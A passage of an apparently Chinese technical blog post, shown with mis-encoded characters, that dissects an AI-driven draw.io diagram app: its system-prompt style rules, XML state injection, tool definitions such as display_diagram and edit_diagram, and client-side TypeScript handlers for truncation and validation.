<span class="hljs-comment">### å¸¦è·¯å¾„ç‚¹çš„è¾¹ï¼ˆç»•è¿‡éšœç¢ç‰©ï¼‰ - å…³é”®æ¨¡å¼ï¼š</span>

**åœºæ™¯ï¼š** Hotfixï¼ˆå³ä¸‹ï¼‰â†’ Mainï¼ˆä¸­â€‹â€‹ä¸Šï¼‰ï¼Œä½† Developï¼ˆä¸­ä¸­ï¼‰ä½äºä¸¤è€…ä¹‹é—´ã€‚

**é”™è¯¯ï¼š** ç›´æ¥æ–œçº¿ç©¿è¿‡ Develop èŠ‚ç‚¹

**æ­£ç¡®ï¼š** ç»•å¤–åœˆèµ°ï¼ˆå…ˆå‘å³ï¼Œå†å‘ä¸Šï¼‰

\`\`\`xml

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"hotfix_to_main"</span> style=<span class="hljs-string">"edgeStyle=orthogonalEdgeStyle;exitX=0.5;exitY=0;entryX=1;entryY=0.5;endArrow=classic;"</span> edge=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span> <span class="hljs-built_in">source</span>=<span class="hljs-string">"hotfix"</span> target=<span class="hljs-string">"main"</span>&gt;

&lt;mxGeometry relative=<span class="hljs-string">"1"</span> as=<span class="hljs-string">"geometry"</span>&gt;

&lt;Array as=<span class="hljs-string">"points"</span>&gt;

&lt;mxPoint x=<span class="hljs-string">"750"</span> y=<span class="hljs-string">"80"</span>/&gt;

&lt;mxPoint x=<span class="hljs-string">"750"</span> y=<span class="hljs-string">"150"</span>/&gt;

&lt;/Array&gt;

&lt;/mxGeometry&gt;

&lt;/mxCell&gt;

\`\`\` è¿™æ¡è·¯å¾„å°†è¾¹è·¯ç”±åˆ°æ‰€æœ‰å½¢çŠ¶çš„å³ä¾§ (x=750)ï¼Œç„¶åä»å³ä¾§è¿›å…¥ Mainã€‚

**å…³é”®åŸåˆ™ï¼š** å½“ä»¥å¯¹è§’çº¿æ–¹å¼è¿æ¥è¿œå¤„çš„èŠ‚ç‚¹æ—¶ï¼Œåº”æ²¿ç€å›¾è¡¨çš„å‘¨é•¿è·¯ç”±ï¼Œè€Œä¸æ˜¯ç©¿è¿‡å…¶ä»–å½¢çŠ¶æ‰€åœ¨çš„ä¸­å¿ƒã€‚
</code></pre>
<h6 data-id="heading-7">æ ·å¼æç¤ºè¯ï¼ˆ<code>STYLE_INSTRUCTIONS</code>å’Œ<code>MINIMAL_STYLE_INSTRUCTION</code>ï¼‰</h6>
<p>è¿™é‡Œå®šä¹‰äº†ä¸¤ç§é£æ ¼</p>
<pre><code class="hljs language-ini" lang="ini">// STYLE_INSTRUCTIONS

å¸¸ç”¨æ ·å¼ï¼š

- å½¢çŠ¶ï¼š<span class="hljs-attr">rounded</span>=<span class="hljs-number">1</span>ï¼ˆåœ†è§’ï¼‰ï¼ŒfillColor=<span class="hljs-comment">#heâ€‹â€‹xï¼ŒstrokeColor=#heâ€‹â€‹x</span>

- è¾¹ç¼˜ï¼š<span class="hljs-attr">endArrow</span>=classic/block/open/noneï¼ŒstartArrow=none/classicï¼Œcurled=<span class="hljs-number">1</span>ï¼ŒedgeStyle=orthogonalEdgeStyle

- æ–‡æœ¬ï¼š<span class="hljs-attr">fontSize</span>=<span class="hljs-number">14</span>ï¼ŒfontStyle=<span class="hljs-number">1</span>ï¼ˆç²—ä½“ï¼‰ï¼Œalign=center/left/right
</code></pre>
<pre><code class="hljs language-markdown" lang="markdown">// MINIMAL<span class="hljs-emphasis">_STYLE_</span>INSTRUCTION

<span class="hljs-section">## âš ï¸ æç®€é£æ ¼æ¨¡å¼å·²å¯ç”¨ âš ï¸</span>

<span class="hljs-section">### æ— æ ·å¼ - çº¯é»‘/ç™½</span>

<span class="hljs-bullet">-</span> æ— å¡«å……é¢œè‰²ã€æè¾¹é¢œè‰²ã€åœ†è§’ã€å­—ä½“å¤§å°ã€å­—ä½“æ ·å¼

<span class="hljs-bullet">-</span> æ— é¢œè‰²å±æ€§ï¼ˆæ— åå…­è¿›åˆ¶é¢œè‰²ï¼Œä¾‹å¦‚ #ff69b4ï¼‰

<span class="hljs-bullet">-</span> æ ·å¼ï¼šå½¢çŠ¶ä½¿ç”¨â€œwhiteSpace=wrap;html=1;â€ï¼Œè¾¹ç¼˜ä½¿ç”¨â€œhtml=1;endArrow=classic;â€

<span class="hljs-bullet">-</span> è¯·å¿½ç•¥ä»¥ä¸‹æ‰€æœ‰é¢œè‰²/æ ·å¼ç¤ºä¾‹

<span class="hljs-section">### å®¹å™¨/åˆ†ç»„å½¢çŠ¶ - å¿…é¡»é€æ˜</span>

<span class="hljs-bullet">-</span> å¯¹äºå®¹å™¨å½¢çŠ¶ï¼ˆåŒ…å«å…¶ä»–å½¢çŠ¶çš„ç›’å­ï¼‰ï¼šä½¿ç”¨â€œfillColor=none;â€ä½¿èƒŒæ™¯é€æ˜

<span class="hljs-bullet">-</span> è¿™å¯ä»¥é˜²æ­¢å®¹å™¨è¦†ç›–å­å…ƒç´ 

<span class="hljs-bullet">-</span> ä¾‹å¦‚ï¼šstyle="whiteSpace=wrap;html=1;fillColor=none;"é€‚ç”¨äºå®¹å™¨çŸ©å½¢

<span class="hljs-section">### æ³¨é‡å¸ƒå±€è´¨é‡</span>

ç”±äºæˆ‘ä»¬çœç•¥äº†æ ·å¼è®¾ç½®ï¼Œè¯·ä¸¥æ ¼éµå®ˆä»¥ä¸‹â€œè¾¹ç¼˜è·¯ç”±è§„åˆ™â€éƒ¨åˆ†ï¼š

<span class="hljs-bullet">-</span> é—´è·ï¼šæ‰€æœ‰å…ƒç´ ä¹‹é—´è‡³å°‘ä¿æŒ 50px çš„é—´è·

<span class="hljs-bullet">-</span> æ— é‡å ï¼šå…ƒç´ å’Œè¾¹ç¼˜ç»ä¸èƒ½é‡å 

<span class="hljs-bullet">-</span> ç®­å¤´å®šä½å¿…é¡»éµå¾ªå…¨éƒ¨ 7 æ¡è¾¹ç¼˜è·¯ç”±è§„åˆ™

<span class="hljs-bullet">-</span> ä½¿ç”¨è·¯å¾„ç‚¹ç»•è¿‡éšœç¢ç‰©

<span class="hljs-bullet">-</span> å¯¹äºåŒä¸€èŠ‚ç‚¹ä¹‹é—´çš„å¤šæ¡è¾¹ç¼˜ï¼Œä½¿ç”¨ä¸åŒçš„ exitY/entryY å€¼

</code></pre>
<h6 data-id="heading-8"><code>XML</code>çŠ¶æ€</h6>
<pre><code class="hljs language-typescript" lang="typescript">${previousXml
	? <span class="hljs-string">`ä¸Šä¸€ä¸ªå›¾è¡¨ XMLï¼ˆç”¨æˆ·æœ€åä¸€æ¡æ¶ˆæ¯ä¹‹å‰ï¼‰ï¼š\n"""xml\n<span class="hljs-subst">${previousXml}</span>\n"""\n\n`</span>
	: <span class="hljs-string">""</span>
}å½“å‰å›¾è¡¨ <span class="hljs-variable constant_">XML</span>ï¼ˆæƒå¨ - å”¯ä¸€æ•°æ®æºï¼‰ï¼š\n<span class="hljs-string">""</span><span class="hljs-string">"xml\n${xml || "</span><span class="hljs-string">"}\n"</span><span class="hljs-string">""</span>\n\né‡è¦æç¤ºï¼šå½“å‰å›¾è¡¨ <span class="hljs-variable constant_">XML</span> æ˜¯ç”»å¸ƒä¸Šå½“å‰å†…å®¹çš„å”¯ä¸€æ•°æ®æºã€‚ç”¨æˆ·å¯ä»¥åœ¨ draw.<span class="hljs-property">io</span> ä¸­æ‰‹åŠ¨æ·»åŠ ã€åˆ é™¤æˆ–ä¿®æ”¹å½¢çŠ¶ã€‚å§‹ç»ˆåŸºäºå½“å‰ <span class="hljs-variable constant_">XML</span> æ¥è®¡æ•°å’Œæè¿°å…ƒç´ ï¼Œè€Œä¸æ˜¯åŸºäºä¹‹å‰ç”Ÿæˆçš„ <span class="hljs-variable constant_">XML</span>ã€‚å¦‚æœåŒæ—¶æ˜¾ç¤ºäº†ä¸Šä¸€ä¸ªå’Œå½“å‰çš„ <span class="hljs-variable constant_">XML</span>ï¼Œè¯·æ¯”è¾ƒå®ƒä»¬ä»¥äº†è§£ç”¨æˆ·æ›´æ”¹äº†å“ªäº›å†…å®¹ã€‚ä½¿ç”¨ edit_diagram æ—¶ï¼Œè¯·åŠ¡å¿…ä»å½“å‰ <span class="hljs-variable constant_">XML</span> ä¸­å®Œå…¨å¤åˆ¶æœç´¢æ¨¡å¼ - å±æ€§é¡ºåºå¾ˆé‡è¦ï¼
</code></pre>
<h5 data-id="heading-9">b.<code>tool</code>å®šä¹‰ä¸æ³¨å…¥</h5>
<blockquote>
<p>ä»£ç ä½äº<code>app\api\chat\route.ts[595-760]</code></p>
</blockquote>
<p>å’Œä¸Šè¿°ç³»ç»Ÿæç¤ºè¯ä¸­æ³¨å…¥çš„ä¸€èˆ¬ï¼Œå®¢æˆ·ç«¯ä¾§æ³¨å…¥çš„èƒ½åŠ›å…±æœ‰å››ä¸ªï¼š
<code>display_diagram</code>ã€<code>edit_diagram</code>ã€<code>append_diagram</code>å’Œ<code>get_shape_library</code></p>
<h6 data-id="heading-10"><code>display_diagram</code></h6>
<pre><code class="hljs language-ini" lang="ini">åœ¨draw.ioä¸Šæ˜¾ç¤ºå›¾è¡¨ã€‚åªä¼ é€’mxCellå…ƒç´ â€”â€”åŒ…è£…å™¨æ ‡ç­¾å’Œæ ¹å•å…ƒæ˜¯è‡ªåŠ¨æ·»åŠ çš„ã€‚



éªŒè¯è§„åˆ™ï¼ˆå¦‚æœè¿åï¼ŒXMLå°†è¢«æ‹’ç»ï¼‰ï¼š

1. åªç”ŸæˆmxCellå…ƒç´ -æ²¡æœ‰åŒ…è£…æ ‡ç­¾ï¼ˆ&lt;mxfile&gt;, &lt;mxGraphModel&gt;, &lt;root&gt;ï¼‰

2. ä¸åŒ…æ‹¬æ ¹Cellsï¼ˆ<span class="hljs-attr">id</span>=<span class="hljs-string">"0â€œæˆ–id=â€1"</span>ï¼‰ -ä»–ä»¬æ˜¯è‡ªåŠ¨æ·»åŠ 

3. æ‰€æœ‰çš„mxCellå…ƒç´ å¿…é¡»æ˜¯å…„å¼Ÿå…ƒç´ â€”â€”ä¸èƒ½åµŒå¥—

4. æ¯ä¸ªmxCelléƒ½éœ€è¦ä¸€ä¸ªå”¯ä¸€çš„idï¼ˆä»â€œ2â€å¼€å§‹ï¼‰

5. æ¯ä¸ªmxCelléƒ½éœ€è¦ä¸€ä¸ªæœ‰æ•ˆçš„çˆ¶å±æ€§ï¼ˆä½¿ç”¨â€œ1â€ä½œä¸ºé¡¶å±‚ï¼‰

6. è½¬ä¹‰å€¼ä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼š&amp;ltï¼› &amp;gt<span class="hljs-comment">; &amp; &amp;quotï¼›</span>



ç¤ºä¾‹ï¼ˆåªç”Ÿæˆè¿™ä¸ª-ä¸ç”ŸæˆåŒ…è£…å™¨æ ‡ç­¾ï¼‰ï¼š

&lt;mxCell <span class="hljs-attr">id</span>=<span class="hljs-string">"lane1"</span> value=â€œFrontendâ€œ style=â€æ³³é“â€ vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span>&gt;

&lt;mxGeometry <span class="hljs-attr">x</span>=<span class="hljs-string">"40"</span> y=<span class="hljs-string">"40"</span> width=<span class="hljs-string">"200"</span> height=<span class="hljs-string">"200"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt; / mxCell &gt;

&lt;mxCell <span class="hljs-attr">id</span>=<span class="hljs-string">"step1"</span> value=<span class="hljs-string">" step1"</span> style=<span class="hljs-string">"round =1 "</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"lane1"</span>&gt;

&lt;mxGeometry <span class="hljs-attr">x</span>=<span class="hljs-string">"20"</span> y=<span class="hljs-string">"60"</span> width=<span class="hljs-string">"160"</span> height=<span class="hljs-string">"40"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt; / mxCell &gt;

&lt;mxCell <span class="hljs-attr">id</span>=<span class="hljs-string">"lane2"</span> value=<span class="hljs-string">"Backend"</span> style=<span class="hljs-string">"swimlane "</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span>&gt;

&lt;mxGeometry <span class="hljs-attr">x</span>=<span class="hljs-string">"280"</span> y=<span class="hljs-string">"40"</span> width=<span class="hljs-string">"200"</span> height=<span class="hljs-string">"200"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt; / mxCell &gt;

&lt;mxCell <span class="hljs-attr">id</span>=<span class="hljs-string">"step2"</span> value=<span class="hljs-string">" step2"</span> style=<span class="hljs-string">"round =1 "</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"lane2"</span>&gt;

&lt;mxGeometry <span class="hljs-attr">x</span>=<span class="hljs-string">"20"</span> y=<span class="hljs-string">"60"</span> width=<span class="hljs-string">"160"</span> height=<span class="hljs-string">"40"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt; / mxCell &gt;

&lt;mxCell <span class="hljs-attr">id</span>=<span class="hljs-string">"edge1"</span> style=<span class="hljs-string">"edgeStyle= "</span> orthogonalEdgeStyle <span class="hljs-string">" endArrow=classic;"</span> edge=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span> source=<span class="hljs-string">"step1"</span> target=<span class="hljs-string">"step2"</span>&gt;

&lt;mxGeometry <span class="hljs-attr">relative</span>=<span class="hljs-string">"1"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt; / mxCell &gt;



æ³¨:

â€”å¯¹äºAWSå›¾è¡¨ï¼Œè¯·ä½¿ç”¨**AWS 2025å›¾æ ‡**ã€‚

-å¯¹äºåŠ¨ç”»è¿æ¥å™¨ï¼Œæ·»åŠ â€œ<span class="hljs-attr">flowAnimation</span>=<span class="hljs-number">1</span>â€è¾¹ç¼˜æ ·å¼ã€‚
</code></pre>
<h6 data-id="heading-11"><code>edit_diagram</code></h6>
<pre><code class="hljs language-bash" lang="bash">
é€šè¿‡åŸºäº<span class="hljs-built_in">id</span>çš„æ“ä½œï¼ˆæ›´æ–°/æ·»åŠ /åˆ é™¤å•å…ƒæ ¼ï¼‰ç¼–è¾‘å½“å‰å…³ç³»å›¾ã€‚

æ“ä½œ:
â€”updateï¼šé€šè¿‡å®ƒçš„<span class="hljs-built_in">id</span>å°†ç°æœ‰å•å…ƒæ ¼æ›¿æ¢ã€‚æä¾›cell_idå’Œå®Œæ•´çš„new_xmlã€‚
â€”addï¼šæ·»åŠ æ–°çš„å•å…ƒæ ¼ã€‚æä¾›cell_idï¼ˆæ–°çš„å”¯ä¸€<span class="hljs-built_in">id</span>ï¼‰å’Œnew_xmlã€‚
â€”deleteï¼šåˆ é™¤å•å…ƒæ ¼ã€‚çº§è”æ˜¯è‡ªåŠ¨çš„ï¼šå­çº§å’Œè¾¹ï¼ˆæº/ç›®æ ‡ï¼‰è¢«è‡ªåŠ¨åˆ é™¤ã€‚åªèƒ½æŒ‡å®šä¸€ä¸ªcell_idã€‚

å¯¹äºæ›´æ–°/æ·»åŠ ï¼Œnew_xmlå¿…é¡»æ˜¯ä¸€ä¸ªå®Œæ•´çš„mxCellå…ƒç´ ï¼ŒåŒ…æ‹¬mxGeometryã€‚

âš ï¸JSON ESCAPING: new_xmlä¸­çš„æ¯ä¸€ä¸ªâ€œå¿…é¡»è¢«è½¬ä¹‰ä¸º\\â€ã€‚ç¤ºä¾‹ï¼š<span class="hljs-built_in">id</span>=\\"5\\" value=\\â€œLabel\\â€

â€”æ·»åŠ ä¸€ä¸ªçŸ©å½¢ï¼š
{<span class="hljs-string">"operations"</span>: [{<span class="hljs-string">"operation"</span>: <span class="hljs-string">"add"</span>, <span class="hljs-string">"cell_id"</span>: <span class="hljs-string">"rect-1"</span>, <span class="hljs-string">"new_xml"</span>: <span class="hljs-string">"&lt;mxCell id=\\"</span>rect-1\\" value=\\"Hello\\" style=\\"rounded=0; \\" vertex=\\"1\\" parent=\\"1\\"&gt;&lt;mxGeometry x=\\"100\\" y=\\"100\\" width=\\"120\\" height=\\"60\\" as=\\"geometry\\"/&gt;&lt;/mxCell&gt;<span class="hljs-string">"}]}

ç¤ºä¾‹-åˆ é™¤å®¹å™¨ï¼ˆå­èŠ‚ç‚¹å’Œè¾¹ç¼˜è‡ªåŠ¨åˆ é™¤ï¼‰ï¼š
{"</span>operations<span class="hljs-string">": [{"</span>operation<span class="hljs-string">": "</span>delete<span class="hljs-string">", "</span>cell_id<span class="hljs-string">": "</span>2<span class="hljs-string">"}]}

</span></code></pre>
<h6 data-id="heading-12"><code>append_diagram</code></h6>
<pre><code class="hljs language-markdown" lang="markdown">å½“å…ˆå‰çš„display<span class="hljs-emphasis">_diagramè¾“å‡ºç”±äºé•¿åº¦é™åˆ¶è€Œè¢«æˆªæ–­æ—¶ï¼Œç»§ç»­ç”Ÿæˆå›¾è¡¨XMLã€‚

ä½•æ—¶ä½¿ç”¨ï¼šä»…åœ¨display_</span>diagramè¢«æˆªæ–­åè°ƒç”¨æ­¤å·¥å…·ï¼ˆæ‚¨å°†çœ‹åˆ°å…³äºæˆªæ–­çš„é”™è¯¯æ¶ˆæ¯ï¼‰ã€‚

å…³é”®çš„æŒ‡ä»¤:
<span class="hljs-bullet">1.</span> ä¸åŒ…æ‹¬ä»»ä½•åŒ…è£…æ ‡ç­¾-åªæ˜¯ç»§ç»­mxCellå…ƒç´ 
<span class="hljs-bullet">2.</span> ä»ä¹‹å‰è¾“å‡ºåœæ­¢çš„åœ°æ–¹ç»§ç»­
<span class="hljs-bullet">3.</span> å®Œæˆå‰©ä½™çš„mxCellå…ƒç´ 
<span class="hljs-bullet">4.</span> å¦‚æœä»ç„¶è¢«æˆªæ–­ï¼Œä½¿ç”¨ä¸‹ä¸€ä¸ªç‰‡æ®µå†æ¬¡è°ƒç”¨append<span class="hljs-emphasis">_diagram

ä¾‹å¦‚ï¼šå¦‚æœå‰é¢çš„è¾“å‡ºä»¥â€˜<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">mxCell</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"x"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"rounded=1 â€œç»“å°¾ï¼Œåˆ™ç»§ç»­ä»¥â€™ï¼›â€ vertex="</span><span class="hljs-attr">1</span>"&gt;</span></span>â€¦â€™å¹¶å®Œæˆå‰©ä¸‹çš„å…ƒç´ ã€‚

</span></code></pre>
<h6 data-id="heading-13"><code>get_shape_library</code></h6>
<p>è¿™äº›å½¢çŠ¶/å›¾æ ‡æ–‡æ¡£å†…å®¹æ”¾ç½®äº<code>docs\shape-libraries</code>ï¼Œå®ƒçš„å®é™…ä½œç”¨æ˜¯åœ¨è°ƒç”¨å…¶ä»–ç”»å¸ƒå·¥å…·å‰æ‰§è¡Œçš„é¢å¤–çŸ¥è¯†è·å–ã€‚</p>
<pre><code class="hljs language-diff" lang="diff">è·å–`draw.io`å½¢çŠ¶/å›¾æ ‡åº“æ–‡æ¡£ï¼ŒåŒ…å«æ ·å¼è¯­æ³•å’Œå½¢çŠ¶åç§°ã€‚

å¯ç”¨åº“:
<span class="hljs-deletion">- Cloud: aws4, azure2, gcp2, alibaba_cloud, openstack, salesforce</span>
<span class="hljs-deletion">- Networking: cisco19, network, kubernetes, vvd, rack</span>
<span class="hljs-deletion">- Business: bpmn, lean_mapping</span>
<span class="hljs-deletion">- General: flowchart, basic, arrows2, infographic, sitemap</span>
<span class="hljs-deletion">- UI/Mockups: android</span>
<span class="hljs-deletion">- Enterprise: citrix, sap, mscae, atlassian</span>
<span class="hljs-deletion">- Engineering: fluidpower, electrical, pid, cabinets, floorplan</span>
<span class="hljs-deletion">- Icons: webicons</span>

è°ƒç”¨æ­¤å·¥å…·å¯è·å–ç‰¹å®šåº“çš„å½¢çŠ¶åç§°å’Œç”¨æ³•è¯­æ³•ã€‚
</code></pre>
<blockquote>
<p>ä¸å…¶ä»–å·¥å…·æœ‰å·®å¼‚çš„æ˜¯è¿™ä¸€å·¥å…·å±äºæœåŠ¡ç«¯å·¥å…·ï¼Œèƒ½å¤Ÿç›´æ¥è¿”å›ï¼Œè€Œå…¶ä½™ä¸‰ä¸ªæ§åˆ¶ç”»å¸ƒçš„å·¥å…·éœ€è¦ä¸å‰ç«¯äº¤äº’ï¼Œåœ¨è¯¥é¡¹ç›®ä¸­ï¼Œä½¿ç”¨äº†<code>ai.js</code>å’Œ<code>@ai-sdk/react</code>è¿™ä¸¤ä¸ªåº“ç®€åŒ–äº†å¤æ‚çš„å¤§æ¨¡å‹ä¸å‰ç«¯å·¥å…·çš„è°ƒç”¨äº¤äº’ï¼Œå…·ä½“å‚è€ƒï¼š[[é€šè¿‡<code>ai.js</code>ä¸<code>@ai-sdk</code>å®ç°å‰åç«¯toolæ³¨å…¥ä¸äº¤äº’]]</p>
</blockquote>
<h5 data-id="heading-14">c.æ€»ç»“</h5>
<p>æç¤ºè¯éƒ¨åˆ†å®šä¹‰äº†å„ç±»å·¥å…·ï¼ˆæœåŠ¡ç«¯/å®¢æˆ·ç«¯ï¼‰åŠå…¶ç¼–æ’ã€æä¾›äº†ä¸€äº›æ ·ä¾‹ï¼ˆ<code>few-shot</code>ï¼‰ã€åˆ¶å®šäº†ä¸€äº›ç»˜åˆ¶è§„èŒƒã€æè¿°äº†æ ·å¼è§„åˆ™ï¼›æ­¤å¤–åœ¨æ›´æ–°æ—¶ï¼Œé™¤äº†å½“å‰ç”»å¸ƒçš„æ’å¸ƒæ•°æ®è¿˜é¢å¤–æ³¨å…¥äº†ä¸Šä¸€æ¬¡æ¨¡å‹ç”Ÿæˆçš„å›¾æ•°æ®ï¼Œä½¿å¾—æ¨¡å‹æ›´å¥½çš„ç†è§£ç”¨æˆ·è¡Œä¸ºè¿›è¡Œåç»­æ’å¸ƒã€‚</p>
<h4 data-id="heading-15">3.å®¢æˆ·ç«¯æ‰§è¡Œå¤„ç†</h4>
<blockquote>
<p>ä»£ç ä½äº<code>hooks\use-diagram-tool-handlers.ts</code></p>
</blockquote>
<h5 data-id="heading-16">a.<code>display_diagram</code></h5>
<p>æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-css" lang="css">flowchart <span class="hljs-selector-tag">TD</span> 
<span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[<span class="hljs-string">"æå–toolCall.inputä¸­çš„xmlå­—ç¬¦ä¸²"</span>]</span> --&gt; C<span class="hljs-selector-attr">[<span class="hljs-string">"æ£€æµ‹XMLæ˜¯å¦æˆªæ–­ï¼ˆisMxCellXmlCompleteï¼‰"</span>]</span>
C --&gt;|æˆªæ–­ï¼ˆisTruncated=trueï¼‰| D<span class="hljs-selector-attr">[<span class="hljs-string">"å­˜å‚¨ä¸å®Œæ•´XMLåˆ°partialXmlRef"</span>]</span>
D --&gt; E<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›é”™è¯¯æç¤ºï¼Œè¦æ±‚è°ƒç”¨append_diagramç»­ä¼ "</span>]</span>
E --&gt; F<span class="hljs-selector-attr">[<span class="hljs-string">"returnç»ˆæ­¢å‡½æ•°"</span>]</span>
C --&gt;|å®Œæ•´ï¼ˆisTruncated=falseï¼‰| G<span class="hljs-selector-attr">[<span class="hljs-string">"é‡ç½®partialXmlRefä¸ºç©º"</span>]</span>
G --&gt; H<span class="hljs-selector-attr">[<span class="hljs-string">"ç”¨wrapWithMxFileåŒ…è£…XMLä¸ºdraw.ioæ ‡å‡†æ ¼å¼"</span>]</span>
H --&gt; <span class="hljs-selector-tag">I</span><span class="hljs-selector-attr">[<span class="hljs-string">"è°ƒç”¨onDisplayChartéªŒè¯å¹¶åŠ è½½XML"</span>]</span>
<span class="hljs-selector-tag">I</span> --&gt;|éªŒè¯å¤±è´¥ï¼ˆæœ‰validationErrorï¼‰| J<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›é”™è¯¯æç¤ºï¼Œè¦æ±‚ä¿®å¤XMLé‡è¯•"</span>]</span>
<span class="hljs-selector-tag">I</span> --&gt;|éªŒè¯æˆåŠŸï¼ˆæ— validationErrorï¼‰| K<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›æˆåŠŸæç¤ºï¼Œå‰ç«¯æ¸²æŸ“å›¾è¡¨"</span>]</span>
</code></pre>
<p>ä»£ç ä¸»è¦å†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript">
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleDisplayDiagram</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">
Â  toolCall: ToolCall,
Â  addToolOutput: AddToolOutputFn,
</span>) =&gt; {
Â  <span class="hljs-keyword">const</span> { xml } = toolCall.<span class="hljs-property">input</span> <span class="hljs-keyword">as</span> { <span class="hljs-attr">xml</span>: <span class="hljs-built_in">string</span> }

  <span class="hljs-comment">// æ£€æŸ¥å®Œæ•´æ€§</span>
Â  <span class="hljs-keyword">const</span> isTruncated = !<span class="hljs-title function_">isMxCellXmlComplete</span>(xml)
Â  <span class="hljs-keyword">if</span> (isTruncated) {
Â  Â  Â  <span class="hljs-comment">// ä¸´æ—¶å­˜å‚¨ï¼Œä¾¿äºåç»­å®Œå–„</span>
Â  Â  Â  partialXmlRef.<span class="hljs-property">current</span> = xml
     <span class="hljs-comment">// è¿”å›å¤§æ¨¡å‹éœ€è¦ç»­å†™</span>
Â  Â  Â  <span class="hljs-keyword">const</span> partialEnding = partialXmlRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">slice</span>(-<span class="hljs-number">500</span>)
Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"display_diagram"</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`Output was truncated due to length limits. Use the append_diagram tool to continue.

Your output ended with:
\`\`\`
<span class="hljs-subst">${partialEnding}</span>
\`\`\`

NEXT STEP: Call append_diagram with the continuation XML.
- Do NOT include wrapper tags or root cells (id="0", id="1")
- Start from EXACTLY where you stopped
- Complete all remaining mxCell elements`</span>,
Â  Â  Â  })
Â  Â  Â  <span class="hljs-keyword">return</span>
Â  }

Â  <span class="hljs-keyword">const</span> finalXml = xml
Â  partialXmlRef.<span class="hljs-property">current</span> = <span class="hljs-string">""</span>

  <span class="hljs-comment">// åŒ…è£…ä¸º`draw.io`è¯†åˆ«çš„å®Œæ•´æ ¼å¼</span>
Â  <span class="hljs-keyword">const</span> fullXml = <span class="hljs-title function_">wrapWithMxFile</span>(finalXml)

Â  <span class="hljs-comment">// æ¸²æŸ“æ£€éªŒ</span>
Â  <span class="hljs-keyword">const</span> validationError = <span class="hljs-title function_">onDisplayChart</span>(fullXml)
Â  <span class="hljs-keyword">if</span> (validationError) {
Â  Â  Â  <span class="hljs-comment">// è¿”å›éœ€è¦é‡è¯•</span>
Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"display_diagram"</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`<span class="hljs-subst">${validationError}</span>
Please fix the XML issues and call display_diagram again with corrected XML.
Your failed XML:
\`\`\`xml
<span class="hljs-subst">${finalXml}</span>
\`\`\``</span>,
Â  Â  Â  })
Â  } <span class="hljs-keyword">else</span> {
	  <span class="hljs-comment">// è¿”å›æˆåŠŸ</span>
Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"display_diagram"</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">output</span>: <span class="hljs-string">"Successfully displayed the diagram."</span>,
Â  Â  Â  })
Â  }
}

</code></pre>
<h5 data-id="heading-17">b.<code>edit_diagram</code></h5>
<p>æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-css" lang="css">
flowchart <span class="hljs-selector-tag">TD</span>
    <span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[<span class="hljs-string">"æå–ç¼–è¾‘æ“ä½œåˆ—è¡¨operations"</span>]</span> --&gt; <span class="hljs-selector-tag">B</span><span class="hljs-selector-attr">[<span class="hljs-string">"ä¸‰çº§å…œåº•è·å–åŸå§‹XMLâ†’currentXml"</span>]</span>
    <span class="hljs-selector-tag">B</span> --&gt; C<span class="hljs-selector-attr">[<span class="hljs-string">"è°ƒç”¨applyDiagramOperationsæ‰§è¡Œç¼–è¾‘"</span>]</span>
    C --&gt; D{æ“ä½œæ˜¯å¦å‡ºé”™ï¼Ÿ&lt;br/&gt;errors<span class="hljs-selector-class">.length</span>&gt;<span class="hljs-number">0</span>?}
    D --&gt;|æ˜¯| E<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›å…·ä½“çš„æ“ä½œå¤±è´¥å³ä¿®å¤æç¤º+æ¸…ç†ç¼“å­˜â†’ç»“æŸ"</span>]</span>
    D --&gt;|å¦| F<span class="hljs-selector-attr">[<span class="hljs-string">"éªŒè¯ç¼–è¾‘åçš„XMLåˆæ³•æ€§"</span>]</span>
